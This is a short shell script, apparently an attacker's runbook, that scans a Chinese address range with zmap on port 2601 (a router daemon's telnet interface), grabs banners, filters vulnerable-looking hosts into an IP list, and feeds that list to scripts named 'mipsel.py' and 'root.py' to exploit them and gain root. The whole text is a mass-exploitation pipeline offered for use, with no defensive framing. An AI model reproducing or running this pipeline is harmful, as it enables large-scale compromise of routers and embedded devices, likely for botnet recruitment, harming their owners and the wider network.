chmod 777*
ulimit -n999999; ulimit -u999999; ulimit -e999999
./z
zmap -T3 -p2601 -w cn.zone -o live
cat live | ./z telnet -p2601 > banners
cat banners | grep Suppress | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u > ips.txt
python3 mipsel.py ips.txt
python3 root.py ips.txt
